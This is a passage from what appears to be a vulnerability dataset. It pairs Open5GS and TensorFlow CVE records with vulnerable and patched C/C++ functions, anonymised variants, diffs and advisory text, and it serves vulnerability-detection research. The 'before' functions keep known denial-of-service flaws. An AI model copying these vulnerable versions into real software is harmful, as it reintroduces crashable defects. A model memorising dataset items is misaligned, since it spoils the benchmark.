     request->http.content[request->http.content_length] = '\0';","{'deleted_lines': ['        request->http.content_length = len;', '        request->http.content =', '            (char*)ogs_malloc(request->http.content_length + 1);', '        ogs_assert(request->http.content);', '        offset = request->http.content_length;', '        if ((request->http.content_length + len) > OGS_HUGE_LEN) {', '            ogs_error(""Overflow : Content-Length[%d], len[%d]"",', '                        (int)request->http.content_length, (int)len);', '            ogs_assert_if_reached();', '        }', '        request->http.content_length += len;', '        request->http.content = (char *)ogs_realloc(', '                request->http.content, request->http.content_length + 1);', '        ogs_assert(request->http.content);'], 'added_lines': ['        ogs_assert(request->http.content_length == 0);', '        ogs_assert(offset == 0);', '', '        request->http.content = (char*)ogs_malloc(len + 1);', '        ogs_assert(request->http.content_length != 0);', '', '        request->http.content = (char*)ogs_realloc(', '                request->http.content, request->http.content_length + len + 1);', '', '    if (!request->http.content) {', '        stream->memory_overflow = true;', '', '        ogs_error(""Overflow : Content-Length[%d], len[%d]"",', '                    (int)request->http.content_length, (int)len);', '        ogs_log_hexdump(OGS_LOG_ERROR, data, len);', '', '        return 0;', '    }', '', '    offset = request->http.content_length;', '    request->http.content_length += len;']}",True,A vulnerability was found in Open5GS up to 2.4.10. It has been declared as problematic. Affected by this vulnerability is an unknown functionality in the library lib/sbi/client.c of the component AMF. The manipulation leads to denial of service. The attack can be launched remotely. The name of the patch is 724fa568435dae45ef0c3a48b2aabde052afae88. It is recommended to apply a patch to fix this issue. The identifier VDB-209545 was assigned to this vulnerability.,6.5,MEDIUM,1,valid,2022-09-25T06:06:37Z,4
CVE-2022-3299,['CWE-404'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,1,open5gs,Fixed HTTP2 crashes for random JSON data (#1769),724fa568435dae45ef0c3a48b2aabde052afae88,https://github.com/open5gs/open5gs/commit/724fa568435dae45ef0c3a48b2aabde052afae88,lib/sbi/nghttp2-server.c,on_frame_recv,"static int on_frame_recv(nghttp2_session *session,
const nghttp2_frame *frame, void *user_data)
{
int rv;
ogs_sbi_session_t *sbi_sess = user_data;
ogs_sbi_server_t *server = NULL;
ogs_sbi_stream_t *stream = NULL;
ogs_sbi_request_t *request = NULL;
ogs_assert(sbi_sess);
server = sbi_sess->server;
ogs_assert(server);
ogs_assert(server->cb);
ogs_assert(session);
ogs_assert(frame);
stream = nghttp2_session_get_stream_user_data(session, frame->hd.stream_id);
if (!stream) {
if (frame->hd.type == NGHTTP2_SETTINGS) {
sbi_sess->settings.max_concurrent_streams =
nghttp2_session_get_remote_settings(
session, NGHTTP2_SETTINGS_MAX_CONCURRENT_STREAMS);
sbi_sess->settings.enable_push =
nghttp2_session_get_remote_settings(
session, NGHTTP2_SETTINGS_ENABLE_PUSH);
ogs_debug(""MAX_CONCURRENT_STREAMS = %d"",
sbi_sess->settings.max_concurrent_streams);
ogs_debug(""ENABLE_PUSH = %s"",
sbi_sess->settings.enable_push ? ""TRUE"" : ""false"");
} else if (frame->hd.type == NGHTTP2_GOAWAY) {
rv = nghttp2_submit_goaway(
session, NGHTTP2_FLAG_NONE, sbi_sess->last_stream_id,
NGHTTP2_NO_ERROR, NULL, 0);
if (rv != 0) {
ogs_error(""nghttp2_submit_goaway() failed (%d:%s)"",
rv, nghttp2_strerror(rv));
return OGS_ERROR;
}
session_send(sbi_sess);
}
return 0;
}
request = stream->request;
ogs_assert(request);
switch (frame->hd.type) {
case NGHTTP2_HEADERS:
if (frame->headers.cat == NGHTTP2_HCAT_REQUEST) {
const char *expect100 =
ogs_sbi_header_get(request->http.headers, OGS_SBI_EXPECT);
if (expect100 && ogs_strcasecmp(expect100, ""100-continue"") == 0) {
nghttp2_nv nva;
add_header(&nva, "":status"", status_string[100]);
rv = nghttp2_submit_headers(session, NGHTTP2_FLAG_NONE,
stream->stream_id, NULL, &nva, 1, NULL);
if (rv != 0) {
ogs_error(""nghttp2_submit_headers() failed (%d:%s)"",
rv, nghttp2_strerror(rv));
nghttp2_submit_rst_stream(
session, NGHTTP2_FLAG_NONE, stream->stream_id, rv);
return 0;
}
}
}
OGS_GNUC_FALLTHROUGH;
case NGHTTP2_DATA:
if (frame->hd.flags & NGHTTP2_FLAG_END_STREAM) {
ogs_debug(""[%s] %s"", request->h.method, request->h.uri);
if (request->http.content_length && request->http.content) {
ogs_debug(""RECEIVED: %d"", (int)request->http.content_length);
ogs_debug(""%s"", request->http.content);
}
if (server->cb(request, stream) != OGS_OK) {
ogs_warn(""server callback error"");
ogs_assert(true ==
ogs_sbi_server_send_error(stream,
OGS_SBI_HTTP_STATUS_INTERNAL_SERVER_ERROR, NULL,
""server callback error"", NULL));
return 0;
}
break;
}
default:
break;
}
return 0;
}","static int on_frame_recv(nghttp2_session *VAR_0,
const nghttp2_frame *VAR_1, void *VAR_2)
{
int VAR_3;
ogs_sbi_session_t *VAR_4 = VAR_2;
ogs_sbi_server_t *VAR_5 = NULL;
ogs_sbi_stream_t *VAR_6 = NULL;
ogs_sbi_request_t *VAR_7 = NULL;
ogs_assert(VAR_4);
VAR_5 = VAR_4->server;
ogs_assert(VAR_5);
ogs_assert(VAR_5->cb);
ogs_assert(VAR_0);
ogs_assert(VAR_1);
VAR_6 = nghttp2_session_get_stream_user_data(VAR_0, VAR_1->hd.stream_id);
if (!VAR_6) {
if (VAR_1->hd.type == VAR_8) {
VAR_4->settings.max_concurrent_streams =
nghttp2_session_get_remote_settings(
VAR_0, VAR_9);
VAR_4->settings.enable_push =
nghttp2_session_get_remote_settings(
VAR_0, VAR_10);
ogs_debug(""MAX_CONCURRENT_STREAMS = %d"",
VAR_4->settings.max_concurrent_streams);
ogs_debug(""ENABLE_PUSH = %s"",
VAR_4->settings.enable_push ? ""TRUE"" : ""false"");
} else if (VAR_1->hd.type == VAR_11) {
VAR_3 = nghttp2_submit_goaway(
VAR_0, VAR_12, VAR_4->last_stream_id,
VAR_13, NULL, 0);
if (VAR_3 != 0) {
ogs_error(""nghttp2_submit_goaway() failed (%d:%s)"",
VAR_3, nghttp2_strerror(VAR_3));
return VAR_14;
}
session_send(VAR_4);
}
return 0;
}
VAR_7 = VAR_6->request;
ogs_assert(VAR_7);
switch (VAR_1->hd.type) {
case VAR_15:
if (VAR_1->headers.cat == VAR_16) {
const char *VAR_17 =
ogs_sbi_header_get(VAR_7->http.headers, VAR_18);
if (VAR_17 && ogs_strcasecmp(VAR_17, ""100-continue"") == 0) {
nghttp2_nv VAR_19;
add_header(&VAR_19, "":status"", VAR_20[100]);
VAR_3 = nghttp2_submit_headers(VAR_0, VAR_12,
VAR_6->stream_id, NULL, &VAR_19, 1, NULL);
if (VAR_3 != 0) {
ogs_error(""nghttp2_submit_headers() failed (%d:%s)"",
VAR_3, nghttp2_strerror(VAR_3));
nghttp2_submit_rst_stream(
VAR_0, VAR_12, VAR_6->stream_id, VAR_3);
return 0;
}
}
}
VAR_21;
case VAR_22:
if (VAR_1->hd.flags & VAR_23) {
ogs_debug(""[%s] %s"", VAR_7->h.method, VAR_7->h.uri);
if (VAR_7->http.content_length && VAR_7->http.content) {
ogs_debug(""RECEIVED: %d"", (int)VAR_7->http.content_length);
ogs_debug(""%s"", VAR_7->http.content);
}
if (VAR_5->cb(VAR_7, VAR_6) != VAR_24) {
ogs_warn(""server callback error"");
ogs_assert(true ==
ogs_sbi_server_send_error(VAR_6,
VAR_25, NULL,
""server callback error"", NULL));
return 0;
}
break;
}
default:
break;
}
return 0;
}",open5gs/724fa568435dae45ef0c3a48b2aabde052afae88/nghttp2-server.c/vul/before/1.json,"static int on_frame_recv(nghttp2_session *session,
                         const nghttp2_frame *frame, void *user_data)
{
    int rv;
    ogs_sbi_session_t *sbi_sess = user_data;

    ogs_sbi_server_t *server = NULL;
    ogs_sbi_stream_t *stream = NULL;
    ogs_sbi_request_t *request = NULL;

    ogs_assert(sbi_sess);
    server = sbi_sess->server;
    ogs_assert(server);
    ogs_assert(server->cb);

    ogs_assert(session);
    ogs_assert(frame);

    stream = nghttp2_session_get_stream_user_data(session, frame->hd.stream_id);
    if (!stream) {
        if (frame->hd.type == NGHTTP2_SETTINGS) {
            sbi_sess->settings.max_concurrent_streams =
                nghttp2_session_get_remote_settings(
                    session, NGHTTP2_SETTINGS_MAX_CONCURRENT_STREAMS);
            sbi_sess->settings.enable_push =
                nghttp2_session_get_remote_settings(
                    session, NGHTTP2_SETTINGS_ENABLE_PUSH);
            ogs_debug(""MAX_CONCURRENT_STREAMS = %d"",
                sbi_sess->settings.max_concurrent_streams);
            ogs_debug(""ENABLE_PUSH = %s"",
                sbi_sess->settings.enable_push ? ""TRUE"" : ""false"");

        } else if (frame->hd.type == NGHTTP2_GOAWAY) {
            rv = nghttp2_submit_goaway(
                 session, NGHTTP2_FLAG_NONE, sbi_sess->last_stream_id,
                 NGHTTP2_NO_ERROR, NULL, 0);
            if (rv != 0) {
                ogs_error(""nghttp2_submit_goaway() failed (%d:%s)"",
                            rv, nghttp2_strerror(rv));
                return OGS_ERROR;
            }

            session_send(sbi_sess);
        }
        return 0;
    }

    request = stream->request;
    ogs_assert(request);

    switch (frame->hd.type) {
    case NGHTTP2_HEADERS:
        if (frame->headers.cat == NGHTTP2_HCAT_REQUEST) {
            const char *expect100 =
                ogs_sbi_header_get(request->http.headers, OGS_SBI_EXPECT);
            if (expect100 && ogs_strcasecmp(expect100, ""100-continue"") == 0) {
                nghttp2_nv nva;

                add_header(&nva, "":status"", status_string[100]);
                rv = nghttp2_submit_headers(session, NGHTTP2_FLAG_NONE,
                           stream->stream_id, NULL, &nva, 1, NULL);
                if (rv != 0) {
                    ogs_error(""nghttp2_submit_headers() failed (%d:%s)"",
                            rv, nghttp2_strerror(rv));
                    nghttp2_submit_rst_stream(
                            session, NGHTTP2_FLAG_NONE, stream->stream_id, rv);
                    return 0;
                }
            }
        }
        /* fallthrough */
        OGS_GNUC_FALLTHROUGH;

    case NGHTTP2_DATA:
        /* HEADERS or DATA frame with +END_STREAM flag */
        if (frame->hd.flags & NGHTTP2_FLAG_END_STREAM) {
            ogs_log_level_e level = OGS_LOG_DEBUG;

            if (stream->memory_overflow == true)
                level = OGS_LOG_ERROR;

            ogs_log_message(level, 0,
                    ""[%s] %s"", request->h.method, request->h.uri);

            if (request->http.content_length && request->http.content) {
                ogs_log_message(level, 0,
                        ""RECEIVED: %d"", (int)request->http.content_length);
                ogs_log_message(level, 0, ""%s"", request->http.content);
            }

            if (stream->memory_overflow == true) {
                ogs_error(""[DROP] Overflow"");
                break;
            }

            if (server->cb(request, stream) != OGS_OK) {
                ogs_warn(""server callback error"");
                ogs_assert(true ==
                    ogs_sbi_server_send_error(stream,
                        OGS_SBI_HTTP_STATUS_INTERNAL_SERVER_ERROR, NULL,
                        ""server callback error"", NULL));

                return 0;
            }
            break;
        }
    default:
        break;
    }

    return 0;
}","static int on_frame_recv(nghttp2_session *VAR_0,
                         const nghttp2_frame *VAR_1, void *VAR_2)
{
    int VAR_3;
    ogs_sbi_session_t *VAR_4 = VAR_2;

    ogs_sbi_server_t *VAR_5 = NULL;
    ogs_sbi_stream_t *VAR_6 = NULL;
    ogs_sbi_request_t *VAR_7 = NULL;

    ogs_assert(VAR_4);
    VAR_5 = VAR_4->server;
    ogs_assert(VAR_5);
    ogs_assert(VAR_5->cb);

    ogs_assert(VAR_0);
    ogs_assert(VAR_1);

    VAR_6 = nghttp2_session_get_stream_user_data(VAR_0, VAR_1->hd.stream_id);
    if (!VAR_6) {
        if (VAR_1->hd.type == VAR_8) {
            VAR_4->settings.max_concurrent_streams =
                nghttp2_session_get_remote_settings(
                    VAR_0, VAR_9);
            VAR_4->settings.enable_push =
                nghttp2_session_get_remote_settings(
                    VAR_0, VAR_10);
            ogs_debug(""MAX_CONCURRENT_STREAMS = %d"",
                VAR_4->settings.max_concurrent_streams);
            ogs_debug(""ENABLE_PUSH = %s"",
                VAR_4->settings.enable_push ? ""TRUE"" : ""false"");

        } else if (VAR_1->hd.type == VAR_11) {
            VAR_3 = nghttp2_submit_goaway(
                 VAR_0, VAR_12, VAR_4->last_stream_id,
                 VAR_13, NULL, 0);
            if (VAR_3 != 0) {
                ogs_error(""nghttp2_submit_goaway() failed (%d:%s)"",
                            VAR_3, nghttp2_strerror(VAR_3));
                return VAR_14;
            }

            session_send(VAR_4);
        }
        return 0;
    }

    VAR_7 = VAR_6->request;
    ogs_assert(VAR_7);

    switch (VAR_1->hd.type) {
    case VAR_15:
        if (VAR_1->headers.cat == VAR_16) {
            const char *VAR_17 =
                ogs_sbi_header_get(VAR_7->http.headers, VAR_18);
            if (VAR_17 && ogs_strcasecmp(VAR_17, ""100-continue"") == 0) {
                nghttp2_nv VAR_19;

                add_header(&VAR_19, "":status"", VAR_20[100]);
                VAR_3 = nghttp2_submit_headers(VAR_0, VAR_12,
                           VAR_6->stream_id, NULL, &VAR_19, 1, NULL);
                if (VAR_3 != 0) {
                    ogs_error(""nghttp2_submit_headers() failed (%d:%s)"",
                            VAR_3, nghttp2_strerror(VAR_3));
                    nghttp2_submit_rst_stream(
                            VAR_0, VAR_12, VAR_6->stream_id, VAR_3);
                    return 0;
                }
            }
        }
        /* COMMENT_0 */
        VAR_21;

    case VAR_22:
        /* COMMENT_1 */
        if (VAR_1->hd.flags & VAR_23) {
            ogs_log_level_e VAR_24 = VAR_25;

            if (VAR_6->memory_overflow == true)
                VAR_24 = VAR_26;

            ogs_log_message(VAR_24, 0,
                    ""[%s] %s"", VAR_7->h.method, VAR_7->h.uri);

            if (VAR_7->http.content_length && VAR_7->http.content) {
                ogs_log_message(VAR_24, 0,
                        ""RECEIVED: %d"", (int)VAR_7->http.content_length);
                ogs_log_message(VAR_24, 0, ""%s"", VAR_7->http.content);
            }

            if (VAR_6->memory_overflow == true) {
                ogs_error(""[DROP] Overflow"");
                break;
            }

            if (VAR_5->cb(VAR_7, VAR_6) != VAR_27) {
                ogs_warn(""server callback error"");
                ogs_assert(true ==
                    ogs_sbi_server_send_error(VAR_6,
                        VAR_28, NULL,
                        ""server callback error"", NULL));

                return 0;
            }
            break;
        }
    default:
        break;
    }

    return 0;
}",open5gs/724fa568435dae45ef0c3a48b2aabde052afae88/nghttp2-server.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -74,12 +74,23 @@
     case NGHTTP2_DATA:
         /* HEADERS or DATA frame with +END_STREAM flag */
         if (frame->hd.flags & NGHTTP2_FLAG_END_STREAM) {
+            ogs_log_level_e level = OGS_LOG_DEBUG;
 
-            ogs_debug(""[%s] %s"", request->h.method, request->h.uri);
+            if (stream->memory_overflow == true)
+                level = OGS_LOG_ERROR;
+
+            ogs_log_message(level, 0,
+                    ""[%s] %s"", request->h.method, request->h.uri);
 
             if (request->http.content_length && request->http.content) {
-                ogs_debug(""RECEIVED: %d"", (int)request->http.content_length);
-                ogs_debug(""%s"", request->http.content);
+                ogs_log_message(level, 0,
+                        ""RECEIVED: %d"", (int)request->http.content_length);
+                ogs_log_message(level, 0, ""%s"", request->http.content);
+            }
+
+            if (stream->memory_overflow == true) {
+                ogs_error(""[DROP] Overflow"");
+                break;
             }
 
             if (server->cb(request, stream) != OGS_OK) {","{'deleted_lines': ['            ogs_debug(""[%s] %s"", request->h.method, request->h.uri);', '                ogs_debug(""RECEIVED: %d"", (int)request->http.content_length);', '                ogs_debug(""%s"", request->http.content);'], 'added_lines': ['            ogs_log_level_e level = OGS_LOG_DEBUG;', '            if (stream->memory_overflow == true)', '                level = OGS_LOG_ERROR;', '', '            ogs_log_message(level, 0,', '                    ""[%s] %s"", request->h.method, request->h.uri);', '                ogs_log_message(level, 0,', '                        ""RECEIVED: %d"", (int)request->http.content_length);', '                ogs_log_message(level, 0, ""%s"", request->http.content);', '            }', '', '            if (stream->memory_overflow == true) {', '                ogs_error(""[DROP] Overflow"");', '                break;']}",True,A vulnerability was found in Open5GS up to 2.4.10. It has been declared as problematic. Affected by this vulnerability is an unknown functionality in the library lib/sbi/client.c of the component AMF. The manipulation leads to denial of service. The attack can be launched remotely. The name of the patch is 724fa568435dae45ef0c3a48b2aabde052afae88. It is recommended to apply a patch to fix this issue. The identifier VDB-209545 was assigned to this vulnerability.,6.5,MEDIUM,1,valid,2022-09-25T06:06:37Z,4
CVE-2022-41899,['CWE-617'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,tensorflow,"Fix SDCA optimizer crash.

Validates size of the dense_features and example state_data_inputs.
Other validation already verifies that sizes are otherwise consistent.

This looks to be a v1-only op that isn't used internally at all outside
of `contrib`, and no tests.

PiperOrigin-RevId: 478073762",80ff197d03db2a70c6a111f97dcdacad1b0babfa,https://github.com/tensorflow/tensorflow/commit/80ff197d03db2a70c6a111f97dcdacad1b0babfa,tensorflow/core/kernels/sdca_internal.cc,Examples::Initialize,"Status Examples::Initialize(OpKernelContext* const context,
const ModelWeights& weights,
const int num_sparse_features,
const int num_sparse_features_with_values,
const int num_dense_features) {
num_features_ = num_sparse_features + num_dense_features;
OpInputList sparse_example_indices_inputs;
TF_RETURN_IF_ERROR(context->input_list(""sparse_example_indices"",
&sparse_example_indices_inputs));
if (sparse_example_indices_inputs.size() != num_sparse_features)
return errors::InvalidArgument(
""Expected "", num_sparse_features,
"" tensors in sparse_example_indices but got "",
sparse_example_indices_inputs.size());
OpInputList sparse_feature_indices_inputs;
TF_RETURN_IF_ERROR(context->input_list(""sparse_feature_indices"",
&sparse_feature_indices_inputs));
if (sparse_feature_indices_inputs.size() != num_sparse_features)
return errors::InvalidArgument(
""Expected "", num_sparse_features,
"" tensors in sparse_feature_indices but got "",
sparse_feature_indices_inputs.size());
OpInputList sparse_feature_values_inputs;
if (num_sparse_features_with_values > 0) {
TF_RETURN_IF_ERROR(context->input_list(""sparse_feature_values"",
&sparse_feature_values_inputs));
if (sparse_feature_values_inputs.size() != num_sparse_features_with_values)
return errors::InvalidArgument(
""Expected "", num_sparse_features_with_values,
"" tensors in sparse_feature_values but got "",
sparse_feature_values_inputs.size());
}
const Tensor* example_weights_t;
TF_RETURN_IF_ERROR(context->input(""example_weights"", &example_weights_t));
auto example_weights = example_weights_t->flat<float>();
if (example_weights.size() >= std::numeric_limits<int>::max()) {
return errors::InvalidArgument(strings::Printf(
""Too many examples in a mini-batch: %zu > %d"", example_weights.size(),
std::numeric_limits<int>::max()));
}
const int num_examples = static_cast<int>(example_weights.size());
const Tensor* example_labels_t;
TF_RETURN_IF_ERROR(context->input(""example_labels"", &example_labels_t));
auto example_labels = example_labels_t->flat<float>();
if (example_labels.size() != num_examples) {
return errors::InvalidArgument(""Expected "", num_examples,
"" example labels but got "",
example_labels.size());
}
OpInputList dense_features_inputs;
TF_RETURN_IF_ERROR(
context->input_list(""dense_features"", &dense_features_inputs));
examples_.clear();
examples_.resize(num_examples);
probabilities_.resize(num_examples);
sampled_index_.resize(num_examples);
sampled_count_.resize(num_examples);
for (int example_id = 0; example_id < num_examples; ++example_id) {
Example* const example = &examples_[example_id];
example->sparse_features_.resize(num_sparse_features);
example->dense_vectors_.resize(num_dense_features);
example->example_weight_ = example_weights(example_id);
example->example_label_ = example_labels(example_id);
}
const DeviceBase::CpuWorkerThreads& worker_threads =
*context->device()->tensorflow_cpu_worker_threads();
TF_RETURN_IF_ERROR(CreateSparseFeatureRepresentation(
worker_threads, num_examples, num_sparse_features, weights,
sparse_example_indices_inputs, sparse_feature_indices_inputs,
sparse_feature_values_inputs, &examples_));
TF_RETURN_IF_ERROR(CreateDenseFeatureRepresentation(
worker_threads, num_examples, num_dense_features, weights,
dense_features_inputs, &examples_));
TF_RETURN_IF_ERROR(ComputeSquaredNormPerExample(
worker_threads, num_examples, num_sparse_features, num_dense_features,
&examples_));
return OkStatus();
}","Status Examples::Initialize(OpKernelContext* const VAR_0,
const ModelWeights& VAR_1,
const int VAR_2,
const int VAR_3,
const int VAR_4) {
VAR_5 = VAR_2 + VAR_4;
OpInputList VAR_6;
TF_RETURN_IF_ERROR(VAR_0->input_list(""sparse_example_indices"",
&VAR_6));
if (VAR_6.size() != VAR_2)
return errors::InvalidArgument(
""Expected "", VAR_2,
"" tensors in sparse_example_indices but got "",
VAR_6.size());
OpInputList VAR_7;
TF_RETURN_IF_ERROR(VAR_0->input_list(""sparse_feature_indices"",
&VAR_7));
if (VAR_7.size() != VAR_2)
return errors::InvalidArgument(
""Expected "", VAR_2,
"" tensors in sparse_feature_indices but got "",
VAR_7.size());
OpInputList VAR_8;
if (VAR_3 > 0) {
TF_RETURN_IF_ERROR(VAR_0->input_list(""sparse_feature_values"",
&VAR_8));
if (VAR_8.size() != VAR_3)
return errors::InvalidArgument(
""Expected "", VAR_3,
"" tensors in sparse_feature_values but got "",
VAR_8.size());
}
const Tensor* VAR_9;
TF_RETURN_IF_ERROR(VAR_0->input(""example_weights"", &VAR_9));
auto VAR_10 = VAR_9->flat<float>();
if (VAR_10.size() >= std::numeric_limits<int>::max()) {
return errors::InvalidArgument(strings::Printf(
""Too many examples in a mini-batch: %zu > %d"", VAR_10.size(),
std::numeric_limits<int>::max()));
}
const int VAR_11 = VAR_12<int>(VAR_10.size());
const Tensor* VAR_13;
TF_RETURN_IF_ERROR(VAR_0->input(""example_labels"", &VAR_13));
auto VAR_14 = VAR_13->flat<float>();
if (VAR_14.size() != VAR_11) {
return errors::InvalidArgument(""Expected "", VAR_11,
"" example labels but got "",
VAR_14.size());
}
OpInputList VAR_15;
TF_RETURN_IF_ERROR(
VAR_0->input_list(""dense_features"", &VAR_15));
VAR_16.clear();
VAR_16.resize(VAR_11);
VAR_17.resize(VAR_11);
VAR_18.resize(VAR_11);
VAR_19.resize(VAR_11);
for (int VAR_20 = 0; VAR_20 < VAR_11; ++VAR_20) {
Example* const VAR_21 = &VAR_16[VAR_20];
VAR_21->sparse_features_.resize(VAR_2);
VAR_21->dense_vectors_.resize(VAR_4);
VAR_21->example_weight_ = VAR_10(VAR_20);
VAR_21->example_label_ = VAR_14(VAR_20);
}
const DeviceBase::CpuWorkerThreads& VAR_22 =
*VAR_0->device()->tensorflow_cpu_worker_threads();
TF_RETURN_IF_ERROR(CreateSparseFeatureRepresentation(
VAR_22, VAR_11, VAR_2, VAR_1,
VAR_6, VAR_7,
VAR_8, &VAR_16));
TF_RETURN_IF_ERROR(CreateDenseFeatureRepresentation(
VAR_22, VAR_11, VAR_4, VAR_1,
VAR_15, &VAR_16));
TF_RETURN_IF_ERROR(ComputeSquaredNormPerExample(
VAR_22, VAR_11, VAR_2, VAR_4,
&VAR_16));
return OkStatus();
}",tensorflow/80ff197d03db2a70c6a111f97dcdacad1b0babfa/sdca_internal.cc/vul/before/0.json,"Status Examples::Initialize(OpKernelContext* const context,
                            const ModelWeights& weights,
                            const int num_sparse_features,
                            const int num_sparse_features_with_values,
                            const int num_dense_features) {
  num_features_ = num_sparse_features + num_dense_features;

  OpInputList sparse_example_indices_inputs;
  TF_RETURN_IF_ERROR(context->input_list(""sparse_example_indices"",
                                         &sparse_example_indices_inputs));
  if (sparse_example_indices_inputs.size() != num_sparse_features)
    return errors::InvalidArgument(
        ""Expected "", num_sparse_features,
        "" tensors in sparse_example_indices but got "",
        sparse_example_indices_inputs.size());
  OpInputList sparse_feature_indices_inputs;
  TF_RETURN_IF_ERROR(context->input_list(""sparse_feature_indices"",
                                         &sparse_feature_indices_inputs));
  if (sparse_feature_indices_inputs.size() != num_sparse_features)
    return errors::InvalidArgument(
        ""Expected "", num_sparse_features,
        "" tensors in sparse_feature_indices but got "",
        sparse_feature_indices_inputs.size());
  OpInputList sparse_feature_values_inputs;
  if (num_sparse_features_with_values > 0) {
    TF_RETURN_IF_ERROR(context->input_list(""sparse_feature_values"",
                                           &sparse_feature_values_inputs));
    if (sparse_feature_values_inputs.size() != num_sparse_features_with_values)
      return errors::InvalidArgument(
          ""Expected "", num_sparse_features_with_values,
          "" tensors in sparse_feature_values but got "",
          sparse_feature_values_inputs.size());
  }

  const Tensor* example_weights_t;
  TF_RETURN_IF_ERROR(context->input(""example_weights"", &example_weights_t));
  auto example_weights = example_weights_t->flat<float>();

  if (example_weights.size() >= std::numeric_limits<int>::max()) {
    return errors::InvalidArgument(strings::Printf(
        ""Too many examples in a mini-batch: %zu > %d"", example_weights.size(),
        std::numeric_limits<int>::max()));
  }

  // The static_cast here is safe since num_examples can be at max an int.
  const int num_examples = static_cast<int>(example_weights.size());
  const Tensor* example_labels_t;
  TF_RETURN_IF_ERROR(context->input(""example_labels"", &example_labels_t));
  auto example_labels = example_labels_t->flat<float>();
  if (example_labels.size() != num_examples) {
    return errors::InvalidArgument(""Expected "", num_examples,
                                   "" example labels but got "",
                                   example_labels.size());
  }

  OpInputList dense_features_inputs;
  TF_RETURN_IF_ERROR(
      context->input_list(""dense_features"", &dense_features_inputs));
  for (int i = 0; i < dense_features_inputs.size(); ++i) {
    if (!TensorShapeUtils::IsMatrix(dense_features_inputs[i].shape())) {
      return errors::InvalidArgument(""Dense features at index "", i,
                                     "" must be rank 2 but is rank "",
                                     dense_features_inputs[i].dims());
    }
  }

  examples_.clear();
  examples_.resize(num_examples);
  probabilities_.resize(num_examples);
  sampled_index_.resize(num_examples);
  sampled_count_.resize(num_examples);
  for (int example_id = 0; example_id < num_examples; ++example_id) {
    Example* const example = &examples_[example_id];
    example->sparse_features_.resize(num_sparse_features);
    example->dense_vectors_.resize(num_dense_features);
    example->example_weight_ = example_weights(example_id);
    example->example_label_ = example_labels(example_id);
  }
  const DeviceBase::CpuWorkerThreads& worker_threads =
      *context->device()->tensorflow_cpu_worker_threads();
  TF_RETURN_IF_ERROR(CreateSparseFeatureRepresentation(
      worker_threads, num_examples, num_sparse_features, weights,
      sparse_example_indices_inputs, sparse_feature_indices_inputs,
      sparse_feature_values_inputs, &examples_));
  TF_RETURN_IF_ERROR(CreateDenseFeatureRepresentation(
      worker_threads, num_examples, num_dense_features, weights,
      dense_features_inputs, &examples_));
  TF_RETURN_IF_ERROR(ComputeSquaredNormPerExample(
      worker_threads, num_examples, num_sparse_features, num_dense_features,
      &examples_));
  return OkStatus();
}","Status Examples::Initialize(OpKernelContext* const VAR_0,
                            const ModelWeights& VAR_1,
                            const int VAR_2,
                            const int VAR_3,
                            const int VAR_4) {
  VAR_5 = VAR_2 + VAR_4;

  OpInputList VAR_6;
  TF_RETURN_IF_ERROR(VAR_0->input_list(""sparse_example_indices"",
                                         &VAR_6));
  if (VAR_6.size() != VAR_2)
    return errors::InvalidArgument(
        ""Expected "", VAR_2,
        "" tensors in sparse_example_indices but got "",
        VAR_6.size());
  OpInputList VAR_7;
  TF_RETURN_IF_ERROR(VAR_0->input_list(""sparse_feature_indices"",
                                         &VAR_7));
  if (VAR_7.size() != VAR_2)
    return errors::InvalidArgument(
        ""Expected "", VAR_2,
        "" tensors in sparse_feature_indices but got "",
        VAR_7.size());
  OpInputList VAR_8;
  if (VAR_3 > 0) {
    TF_RETURN_IF_ERROR(VAR_0->input_list(""sparse_feature_values"",
                                           &VAR_8));
    if (VAR_8.size() != VAR_3)
      return errors::InvalidArgument(
          ""Expected "", VAR_3,
          "" tensors in sparse_feature_values but got "",
          VAR_8.size());
  }

  const Tensor* VAR_9;
  TF_RETURN_IF_ERROR(VAR_0->input(""example_weights"", &VAR_9));
  auto VAR_10 = VAR_9->flat<float>();

  if (VAR_10.size() >= std::numeric_limits<int>::max()) {
    return errors::InvalidArgument(strings::Printf(
        ""Too many examples in a mini-batch: %zu > %d"", VAR_10.size(),
        std::numeric_limits<int>::max()));
  }

  /* COMMENT_0 */
  const int VAR_11 = VAR_12<int>(VAR_10.size());
  const Tensor* VAR_13;
  TF_RETURN_IF_ERROR(VAR_0->input(""example_labels"", &VAR_13));
  auto VAR_14 = VAR_13->flat<float>();
  if (VAR_14.size() != VAR_11) {
    return errors::InvalidArgument(""Expected "", VAR_11,
                                   "" example labels but got "",
                                   VAR_14.size());
  }

  OpInputList VAR_15;
  TF_RETURN_IF_ERROR(
      VAR_0->input_list(""dense_features"", &VAR_15));
  for (int VAR_16 = 0; VAR_16 < VAR_15.size(); ++VAR_16) {
    if (!TensorShapeUtils::IsMatrix(VAR_15[VAR_16].shape())) {
      return errors::InvalidArgument(""Dense features at index "", VAR_16,
                                     "" must be rank 2 but is rank "",
                                     VAR_15[VAR_16].dims());
    }
  }

  VAR_17.clear();
  VAR_17.resize(VAR_11);
  VAR_18.resize(VAR_11);
  VAR_19.resize(VAR_11);
  VAR_20.resize(VAR_11);
  for (int VAR_21 = 0; VAR_21 < VAR_11; ++VAR_21) {
    Example* const VAR_22 = &VAR_17[VAR_21];
    VAR_22->sparse_features_.resize(VAR_2);
    VAR_22->dense_vectors_.resize(VAR_4);
    VAR_22->example_weight_ = VAR_10(VAR_21);
    VAR_22->example_label_ = VAR_14(VAR_21);
  }
  const DeviceBase::CpuWorkerThreads& VAR_23 =
      *VAR_0->device()->tensorflow_cpu_worker_threads();
  TF_RETURN_IF_ERROR(CreateSparseFeatureRepresentation(
      VAR_23, VAR_11, VAR_2, VAR_1,
      VAR_6, VAR_7,
      VAR_8, &VAR_17));
  TF_RETURN_IF_ERROR(CreateDenseFeatureRepresentation(
      VAR_23, VAR_11, VAR_4, VAR_1,
      VAR_15, &VAR_17));
  TF_RETURN_IF_ERROR(ComputeSquaredNormPerExample(
      VAR_23, VAR_11, VAR_2, VAR_4,
      &VAR_17));
  return OkStatus();
}",tensorflow/80ff197d03db2a70c6a111f97dcdacad1b0babfa/sdca_internal.cc/vul/after/0.json,"--- func_before
+++ func_after
@@ -56,6 +56,13 @@
   OpInputList dense_features_inputs;
   TF_RETURN_IF_ERROR(
       context->input_list(""dense_features"", &dense_features_inputs));
+  for (int i = 0; i < dense_features_inputs.size(); ++i) {
+    if (!TensorShapeUtils::IsMatrix(dense_features_inputs[i].shape())) {
